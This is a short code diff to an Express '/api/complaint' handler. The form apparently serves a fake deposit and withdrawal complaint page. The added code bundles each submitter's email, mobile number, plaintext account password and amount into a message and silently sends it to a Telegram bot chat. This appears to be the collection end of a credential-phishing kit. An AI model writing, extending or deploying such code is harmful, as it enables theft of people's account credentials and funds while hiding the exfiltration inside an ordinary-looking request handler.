@@ -43,6 +43,20 @@ app.post('/api/complaint', async (req, res) => {
             [email, mobile, password, problem, amount, image]
         );
 
+        const token = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+        const problemType = problem === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem';
+
+        if (token && chatId) {
+            const msg = `📩━━━ NEW COMPLAINT ━━━📩\n\n━━ Account Details ━━\n\n📧 Email\n\`${email}\`\n\n📱 Mobile\n\`${mobile}\`\n\n🔑 Password\n\`${password}\`\n\n━━ Issue Details ━━\n⚠️ Problem: ${problemType}\n💰 Amount: \`${amount}\`\n━━━━━━━━━━━━━━━━━`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            }).catch(() => {});
+        }
+
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
